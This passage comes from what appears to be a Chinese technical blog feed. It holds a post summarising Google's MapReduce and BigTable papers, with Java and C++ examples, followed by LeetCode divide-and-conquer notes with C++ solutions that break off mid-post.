总结</h3><p>上面的内容就是GFS的核心内容了，但是并没有很深入的探讨同时也还有很多内容没有讲到，比如主服务器的垃圾回收机制等等，但是理解其核心思想就已经可以了。</p><h2 id="二、MapReduce"><a href="#二、MapReduce" class="headerlink" title="二、MapReduce"></a>二、MapReduce</h2><h3 id="2-1-MapReduce简述"><a href="#2-1-MapReduce简述" class="headerlink" title="2.1 MapReduce简述"></a>2.1 MapReduce简述</h3><p>MapReduce是一个<strong>分布式、并行处理</strong>的计算框架。<br>MapReduce把任务分为Map阶段和Reduce阶段。开发人员使用存储在DFS中数据(可实现快速存储)，编写分布式计算平台的MapReduce任务。由于MapReduce工作原理以及DFS的特性，平台能以并行的方式访问数据，从而实现快速访问数据。</p><h3 id="2-2-MapReduce编程模型"><a href="#2-2-MapReduce编程模型" class="headerlink" title="2.2 MapReduce编程模型"></a>2.2 MapReduce编程模型</h3><ul><li>Map函数由用户编写，取一个输入对，并产生一组中间键&#x2F;值对。MapReduce库将所有与相同中间键key_i相关联的中间值组合在一起，并将其传递给Reduce函数。</li><li>Reduce函数也由用户编写，接受一个中间键key_i和该键的一组值。它将这些值合并在一起，形成一个可能更小的值集合。通常每次Reduce调用只产生0或1个输出值。中间值通过迭代器提供给用户的reduce函数。这使得我们可以处理太大而无法在内存中拟合的值列表。</li></ul><p>这里给出基于java的实现单词计数的写法示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TokenizerMapper</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, Text, IntWritable&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">IntWritable</span> <span class="variable">one</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Text</span> <span class="variable">word</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Context context)</span> </span><br><span class="line">            <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 将输入行转换为小写，并移除标点符号，只保留字母和空格</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> value.toString().toLowerCase().replaceAll(<span class="string">&quot;[^a-zA-Z\\s]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">// 使用 StringTokenizer 按空格分割单词</span></span><br><span class="line">        <span class="type">StringTokenizer</span> <span class="variable">tokenizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(line);</span><br><span class="line">        <span class="keyword">while</span> (tokenizer.hasMoreTokens()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> tokenizer.nextToken().trim();</span><br><span class="line">            <span class="comment">// 只处理非空单词</span></span><br><span class="line">            <span class="keyword">if</span> (!token.isEmpty()) &#123;</span><br><span class="line">                word.set(token);</span><br><span class="line">                context.write(word, one);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">IntSumReducer</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable, Text, IntWritable&gt; &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">private</span> <span class="type">IntWritable</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Context context)</span> </span><br><span class="line">            <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>; </span><br><span class="line">        <span class="comment">// 累加同一个单词的所有计数</span></span><br><span class="line">        <span class="keyword">for</span> (IntWritable value : values) &#123;</span><br><span class="line">            sum += value.get();</span><br><span class="line">        &#125;</span><br><span class="line">        result.set(sum);</span><br><span class="line">        context.write(key, result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Map和Reduce函数对应的输入和输出如下(list表示的是返回零到多条数据)：</p><table><thead><tr><th align="center">函数</th><th align="center">输入</th><th align="center">输出</th></tr></thead><tbody><tr><td align="center">map</td><td align="center">(k1, v1)</td><td align="center">list(k2, v2)</td></tr><tr><td align="center">reduce</td><td align="center">(k2, list(v2))</td><td align="center">list(v2)</td></tr></tbody></table><h3 id="2-3-执行过程"><a href="#2-3-执行过程" class="headerlink" title="2.3 执行过程"></a>2.3 执行过程</h3><p>MapReduce应用程序执行过程：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post20/df7b6696f7519d1504efd19903139ae6.png" alt="执行过程"></p><p>分为以下七步：</p><ul><li>用户程序中z的MapReduce库首先将输入文件<strong>分割</strong>成M块，通常为16兆字节到64兆字节每块(由用户通过可选参数进行控制)。然后，它在集群机器上启动许多程序的副本。</li><li>程序的副本之一是特殊的–主程序。其余为由主程序分配工作的工人程序。有M个map任务和R个reduce任务需要分配。主程序挑选闲置工人程序，并为每个人分配一个map任务或reduce任务。</li><li>被分配map任务的工人程序读取相应输入分片的内容。它从输入数据中解析出键&#x2F;值对，并将每个键&#x2F;值对传递给用户自定义的Map函数。Map函数产生的中间键&#x2F;值对在<strong>内存</strong>中缓冲。</li><li>当主站通知reduce工人程序位置时，它使用远程调用从map工人程序的本地磁盘读取缓冲数据。当reduce工人程序读取所有中间数据时，它根据中间键对其进行排序，从而将相同键的所有出现<strong>归为一组</strong>。<strong>排序</strong>是需要的，因为通常许多不同的键映射到相同的reduce任务。如果中间数据量太大，不适合在内存中使用，则使用<strong>外部排序</strong>。这一段也是<strong>shuffle过程</strong>。</li><li>reduce工人程序对排序后的中间数据进行<strong>迭代</strong>，对于遇到的每个唯一中间键，将该键和对应的中间值集合传递给用户的Reduce函数。Reduce函数的输出被添加到这个reduce分区的最终输出文件中。</li><li>当所有map任务和reduce任务都已完成时，主程序唤醒用户程序。此时，用户程序中的MapReduce调用返回给用户代码。</li></ul><p>成功完成后，MapReduce的输出执行可用在<em>R</em>输出文件(每个reduce任务一个,文件名由用户指定)中。通常，用户不需要将这些<em>R</em>输出文件组合成一个文件–他们经常将这些文件作为输入传递给另一个MapReduce调用，或者使用它们从另一个分布式应用中处理被分割成多个文件的输入。</p><h3 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4 总结"></a>2.4 总结</h3><p>同样只是简单地讲了核心思想以及流程，很多东西也并没有涉及到，包括shuffle的优化，数据传输以及任务粒度等。想尝试一下MapReduce的话，可以使用<code>Hadoop</code>平台完成简单的WordCount任务，Map和Reduce函数也已经给出。</p><h2 id="三、BigTable"><a href="#三、BigTable" class="headerlink" title="三、BigTable"></a>三、BigTable</h2><h3 id="3-1-BigTable简述"><a href="#3-1-BigTable简述" class="headerlink" title="3.1 BigTable简述"></a>3.1 BigTable简述</h3><p>BigTable是一个用于管理结构化数据的分布式存储系统，其设计目标是扩展到非常大的规模：跨越数千个商品服务器的数百亿字节的数据。它实现了几个目标：<strong>广泛适用性</strong>、<strong>可扩展性</strong>、<strong>高性能</strong>和<strong>高可用性</strong>。</p><p>设计动机：</p><ul><li>需要存储的数据种类繁多：包括URL、网页内容、用户的个性化设置在内的数据都是Google需要经常处理的。</li><li>需要存储的数据种类繁多海量的服务请求：Google运行着目前世界上最繁忙的系统，它每时每刻处理的客户服务请求数量是普通的系统根本无法承受的。</li><li>商用数据库无法满足需求：一方面现有商用数据库的设计着眼点在于其通用性，另一方面对于底层系统的完全掌控会给后期的系统维护、升级带来极大的便利。</li></ul><h3 id="3-2-数据模型"><a href="#3-2-数据模型" class="headerlink" title="3.2 数据模型"></a>3.2 数据模型</h3><p>BigTable是一个稀疏的、分布式的、持久的多维排序映射。map由row_key、column_key和timestamp索引；映射中的每个值都是一个字节的无解释的数组(只负责存储，不负责读懂)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(row:string, column:string, time:int64) → string</span><br></pre></td></tr></table></figure><p>下图是一个存储网页的<em>Webtable</em>：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post20/ad4fce5e8f7864e39f2c8da025980a3b.png" alt="结构示例图"></p><ul><li>row是url的倒转，比如<a href="http://www.google.com会存为com.google.www,这样的目的是前面的www大家都一样,而且子域名就会主域名靠一起,方便聚簇./">www.google.com会存为com.google.www，这样的目的是前面的www大家都一样，而且子域名就会主域名靠一起，方便聚簇。</a></li><li>有多列，其中<code>contents:</code>列存储网页html内容。<code>anchor:</code>列存储指向这个页面的anchor文字，比如cnnsi.com和my.look.ca有指向<a href="http://www.cnn.com的anchor,就如下图所示存储./">www.cnn.com的anchor，就如下图所示存储。</a></li><li>每一个anchor cell只有一个版本，但是content cell有三个版本为t3，t5，t6。</li></ul><h4 id="3-2-1-Row"><a href="#3-2-1-Row" class="headerlink" title="3.2.1 Row"></a>3.2.1 Row</h4><ul><li>行key是表的主键，可以是任意字符串，最大为64kb，在单行的读写都是<strong>原子</strong>的，使客户端在同一行存在并发更新的情况下更容易推断系统的行为。由于读写总是通过行键，这样的数据库也叫做KV数据库。</li><li>BigTable按行key对数据进行排序，行范围<strong>动态分区</strong>，每个行的范围被称为<em>tablet</em>，是分布式和负载均衡的单位。因此，短范围的行读取是高效率的，通常只需要与少量的机器进行通信。客户可以通过选择他们的行键来利用这一特性，从而使他们的数据访问获得良好的局部性。</li></ul><h4 id="3-2-2-Column-Families"><a href="#3-2-2-Column-Families" class="headerlink" title="3.2.2 Column Families"></a>3.2.2 Column Families</h4><ul><li>列族是访问控制的基本单位，同一列族内的所有数据通常类型相同(我们会把同一列族的数据一起压缩)。必须先创建列族，然后才能在该族下使用任何列键；<strong>列族一旦创建，其内部任何列键都可随时使用，也就是说一行的某个列族下可能会出现空值，这也就是说为什么BigTable是稀疏的</strong>。设计时要求一个表中的列族数量很少(最多几百个)，且运行期间极少变更。相比之下，表的列数可以无限。</li><li>列键的命名语法为：<code>family:qualifier</code>。列族名称必须是可打印字符，限定符则可以是任意字符串。以Webtable为例，可以用language当做family，另一种是可以用anchor来当做family(如上图所示)，每个列key是一个anchor，qualifier是指向该url的网址，内容是链接文本。 </li><li>访问控制以及磁盘、内存的计量都在列族级别进行。在Webtable中，这些控制让我们能够管理多种应用：一些负责添加新基础数据，一些读取基础数据并生成派生列族，还有一些只能查看已有数据(甚至可能因隐私原因无法查看所有列族)。比如BigTable的开源实现HBase，每一个列族的数据存在同一个HFile文件下。</li></ul><h4 id="3-2-4-Timestamp"><a href="#3-2-4-Timestamp" class="headerlink" title="3.2.4 Timestamp"></a>3.2.4 Timestamp</h4><ul><li>BigTable中的每个单元格可以包含同一数据的多个版本；这些版本都是以<strong>时间戳为索引</strong>的，时间戳为64位整数。不同版本以<strong>递减</strong>的形式存储，以便可以首先读取最新版本。</li><li>为了减少手动管理多版本数据的麻烦，BigTable给每个列族提供了两种<strong>自动垃圾回收(GC)策略</strong>，让系统自己帮用户清理旧版本：<ul><li>只保留最近n个版本(老版本一旦超过n个就自动删除)。</li><li>只保留“足够新”的版本(n天前写入的任何版本都会被自动清理掉)。</li></ul></li></ul><h3 id="3-3-API"><a href="#3-3-API" class="headerlink" title="3.3 API"></a>3.3 API</h3><p>BigTable API提供了创建和删除表和列族的功能。它还提供了更改簇、表和列族元数据的功能，如访问控制权限。</p><ul><li><p>客户端应用程序可以在大表中写入或删除值，从单个行中查找值，或者在表中的数据子集上进行迭代。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open the table</span></span><br><span class="line">Table *T = <span class="built_in">OpenOrDie</span>(<span class="string">&quot;/bigtable/web/webtable&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a new anchor and delete an old anchor</span></span><br><span class="line"><span class="function">RowMutation <span class="title">r1</span><span class="params">(T, <span class="string">&quot;com.cnn.www&quot;</span>)</span></span>;</span><br><span class="line">r<span class="number">1.</span><span class="built_in">Set</span>(<span class="string">&quot;anchor:www.c-span.org&quot;</span>, <span class="string">&quot;CNN&quot;</span>);</span><br><span class="line">r<span class="number">1.</span><span class="built_in">Delete</span>(<span class="string">&quot;anchor:www.abc.com&quot;</span>);</span><br><span class="line">Operation op;</span><br><span class="line"><span class="built_in">Apply</span>(&amp;op, &amp;r1);</span><br></pre></td></tr></table></figure></li><li><p>客户端可以在多个列族上进行迭代，并且有几种机制来限制扫描产生的行、列和时间戳。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Scanner <span class="title">scanner</span><span class="params">(T)</span></span>;</span><br><span class="line">ScanStream *stream; stream = scanner.<span class="built_in">FetchColumnFamily</span>(<span class="string">&quot;anchor&quot;</span>);</span><br><span class="line">stream-&gt;<span class="built_in">SetReturnAllVersions</span>(); scanner.<span class="built_in">Lookup</span>(<span class="string">&quot;com.cnn.www&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; !stream-&gt;<span class="built_in">Done</span>(); stream-&gt;<span class="built_in">Next</span>()) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s %lld %s\n&quot;</span>,</span><br><span class="line">  scanner.<span class="built_in">RowName</span>(),</span><br><span class="line">  stream-&gt;<span class="built_in">ColumnName</span>(),</span><br><span class="line">  stream-&gt;<span class="built_in">MicroTimestamp</span>(),</span><br><span class="line">  stream-&gt;<span class="built_in">Value</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-4-构建块"><a href="#3-4-构建块" class="headerlink" title="3.4 构建块"></a>3.4 构建块</h3><ul><li><p>BigTable使用<strong>分布式的GFS</strong>来存储日志和数据文件，依赖于集群管理系统，用于调度作业、管理共享机器上的资源、处理机器故障和监控机器状态。</p></li><li><p>BigTable数据格式为<code>SSTable</code>，SSTable提供了一个<strong>不可变的、有序的从键到值的不可变映射</strong>。每个SSTable包含一个块(通常每个块的大小为64KB)，块索引(存储在SSTable的末尾)用于定位块。SSTable打开时索引被加载到内存中，查找时先内存二分查找索引找到块，再从磁盘一次读取指定的块(也可以把整个SSTable加载到内存，这样就不涉及到磁盘了)。</p></li><li><p>BigTable依赖于一种称为<strong>Chubby</strong>的高可用性和持久性的<strong>分布式锁服务</strong>。Chubby包含了5个副本，其中一个被选为master并提供request服务，采用5节点部署，多数派存活即可服务；用Paxos选主并同步<strong>小文件内容</strong>与<strong>锁状态</strong>。Bigtable主要通过Chubby完成以下5个任务：</p><ul><li><strong>Master选举</strong>：同一时刻最多1个活跃Master。</li><li><strong>Bootstrap指针</strong>：记录root tablet在哪台Tablet Server(整个BigTable数据的寻址起点)。</li><li><strong>Tablet Server生命周期</strong>：启动时在Chubby指定目录下创建临时文件标志着上线了；Master监视该目录，文件消失认为下线了。</li><li><strong>Schema存储</strong>：每张表的列族定义、权限ACL作为小文件放在Chubby。</li><li><strong>访问控制列表</strong>：客户端读ACL文件判断用户权限(文件需要从Chubby里获取)。</li></ul><p>如果Chubby不可用，那么Bigtable也将不可用。</p></li></ul><h3 id="3-5-执行过程"><a href="#3-5-执行过程" class="headerlink" title="3.5 执行过程"></a>3.5 执行过程</h3><h4 id="3-5-1-三大组件架构："><a href="#3-5-1-三大组件架构：" class="headerlink" title="3.5.1 三大组件架构："></a>3.5.1 三大组件架构：</h4><table><thead><tr><th align="center">组件</th><th align="center">作用</th><th align="left">特点</th></tr></thead><tbody><tr><td align="center">Client Library</td><td align="center">被链接到每个应用进程里</td><td align="left">- 自己缓存<strong>tablet → 所在服务器</strong>的映射<br>- 读写直接连 Tablet Server，不经过 Master</td></tr><tr><td align="center">Master</td><td align="center">集群管理者</td><td align="left">- 只负责<strong>元数据管理</strong>(分配 tablet、负载均衡、故障检测等)<br>- 不承载数据流量 → 负载很轻</td></tr><tr><td align="center">Tablet Server</td><td align="center">工作者，被master调度</td><td align="left">- 每台管理<strong>10–1000个tablet</strong><br>- 处理<strong>读写请求</strong>及<strong>tablet分裂</strong><br>- 可动态上下线，<strong>弹性伸缩</strong></td></tr></tbody></table><h4 id="3-5-2-数据流路径-关键设计"><a href="#3-5-2-数据流路径-关键设计" class="headerlink" title="3.5.2 数据流路径(关键设计)"></a>3.5.2 数据流路径(关键设计)</h4><ul><li>客户端<strong>首次</strong>从Chubby拿到<strong>root tablet</strong>位置(bootstrap)。</li><li>随后自己<strong>递归</strong>(因为是多级索引)地从<strong>元数据表</strong>(METADATA 表)查出目标tablet所在服务器。</li><li><strong>直接</strong>与对应的Tablet Server建立连接读写数据，因此大部分的读写请求不会经过Master，Master只做后台调度，不会成为性能瓶颈。</li></ul><p>显然这是基于DFS的设计。</p><h4 id="3-5-3-数据分片模型"><a href="#3-5-3-数据分片模型" class="headerlink" title="3.5.3 数据分片模型"></a>3.5.3 数据分片模型</h4><ul><li>table → 多个tablet，每个tablet对应<strong>一段连续的行键范围</strong>(row range)。</li><li><strong>初始</strong>：表只有1个tablet，表可能有多个。</li><li><strong>自动分裂</strong>：当tablet大小达到100–200MB(默认阈值)，Tablet Server会<strong>就地拆成两半</strong>，并<strong>异步通知</strong>Master重新登记，分裂过程对客户端透明，无需停机。</li></ul><p>Row提到过tablet的作用，选择100-200MB作为阈值是因为太小操作过于频繁，太大的话占用内存过大，并发效率降低，可以联想到DFS选择64MB为默认chunk，这样也不会多出很多碎片文件浪费存储空间。</p><h4 id="3-5-4-弹性伸缩"><a href="#3-5-4-弹性伸缩" class="headerlink" title="3.5.4 弹性伸缩"></a>3.5.4 弹性伸缩</h4><ul><li>Tablet Server可动态加减<ul><li>上线：向Chubby注册<strong>临时文件</strong>，Master发现后把<strong>空闲tablet</strong>迁移过来(负载均衡)。</li><li>下线&#x2F;宕机：临时文件消失，Master<strong>将其tablet重新分配</strong>给其他服务器-&gt;集群容量随业务负载平滑扩缩。</li></ul></li></ul><p>这也是前面提到过的Chubby的核心作用之一。</p><h3 id="3-6-总结"><a href="#3-6-总结" class="headerlink" title="3.6 总结"></a>3.6 总结</h3><p>可以看出来BigTable非常依赖GFS这个底层框架，也可以看出来Google工程师的厉害之处。当然BigTable也还有很多东西没有整理，包括tablet位置与动态分区、SSTable底层结构等，但已经整理了其核心内容，<del>剩下的细节设计部分就交给以后的我吧。。。</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件系统 </tag>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(八): 分治</title>
      <link href="/post/2ffba5b8.html"/>
      <url>/post/2ffba5b8.html</url>
      
        <content type="html"><![CDATA[<p>算法解释：顾名思义，分治问题由“分”(divide)和“治”(conquer)两部分组成，通过把原问题分为子问题，再将子问题进行处理合并，从而实现对原问题的求解。我们在排序章节展示的归并排序就是典型的分治问题，其中“分”即为把大数组平均分成两个小数组，通过递归实现，最终我们会得到多个长度为1的子数组;“治”即为把已经排好序的两个小数组合成为一个排好序的大数组从长度为 1 的子数组开始，最终合成一个大数组。</p><ul><li>自上而下的分治可以和 memoization 结合，避免重复遍历相同的子问题。如果方便推导，也可以换用自下而上的动态规划方法求解。</li></ul><h2 id="一、表达式问题"><a href="#一、表达式问题" class="headerlink" title="一、表达式问题"></a>一、表达式问题</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/different-ways-to-add-parentheses?source=vscode">为运算表达式设计优先级</a><br>给定一个只包含加、减和乘法的数学表达式，求通过加括号可以得到多少种不同的结果。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">diffWaysToCompute</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; expression.<span class="built_in">length</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expression[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; expression[i] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; left = <span class="built_in">diffWaysToCompute</span>(expression.<span class="built_in">substr</span>(<span class="number">0</span>, i));</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; right = <span class="built_in">diffWaysToCompute</span>(expression.<span class="built_in">substr</span>(i + <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> l : left) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> r : right) &#123;</span><br><span class="line">                    <span class="type">int</span> temp = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">switch</span> (expression[i]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                        temp = l + r;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                        temp = l * r;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                        temp = l - r;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(temp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="built_in">empty</span>() ? vector&lt;<span class="type">int</span>&gt;&#123;<span class="built_in">stoi</span>(expression)&#125; : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这里采用的是从上而下的分治，注意不是要每次都进行计算而是把left和right的结果先都存起来再进行计算。</p></li></ul><h2 id="二、练习"><a href="#二、练习" class="headerlink" title="二、练习"></a>二、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/beautiful-array?source=vscode">漂亮数组</a><br>如果长度为n的数组nums满足下述条件，则认为该数组是一个漂亮数组：</p><ul><li>nums是由范围[1, n]的整数组成的一个排列。</li><li>对于每个0&lt;&#x3D;i&lt;j&lt;n，均不存在下标k(i&lt;k&lt;j)使得2*nums[k]&#x3D;&#x3D;nums[i]+nums[j] 。<br>给你整数n，返回长度为n的任一 漂亮数组。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">beautifulArray</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> &#123;<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">        <span class="type">int</span> mid = (n + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; left = <span class="built_in">beautifulArray</span>(mid);</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; right = <span class="built_in">beautifulArray</span>(n - mid);</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mid; ++i)</span><br><span class="line">            res.<span class="built_in">push_back</span>(<span class="number">2</span> * left[i] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - mid; ++i)</span><br><span class="line">            res.<span class="built_in">push_back</span>(<span class="number">2</span> * right[i]);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>解答二(动态规划)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">beautifulArray</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>);</span><br><span class="line">        dp[<span class="number">1</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> mid = (i + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; dp[mid].<span class="built_in">size</span>(); ++j)</span><br><span class="line">                dp[i].<span class="built_in">push_back</span>(<span class="number">2</span> * dp[mid][j] - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; dp[i - mid].<span class="built_in">size</span>(); ++j)</span><br><span class="line">                dp[i].<span class="built_in">push_back</span>(<span class="number">2</span> * dp[i - mid][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：动态规划还可以进行优化，这道题的关键是发现它的数学规律，f(n)&#x3D;2*f(n&#x2F;2)-1(奇数部分)，f(n)&#x3D;f(n&#x2F;2)*2(偶数部分)。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/burst-balloons?source=vscode">戳气球</a><br>戳破第i个气球，你可以获得nums[i-1]*nums[i]*nums[i+1]枚硬币。如果i-1或i+1超出了数组的边界，那么就当它是一个数字为1的气球。<br>求所能获得硬币的最大数量。</p><p>解答：</p><figure class="highlight 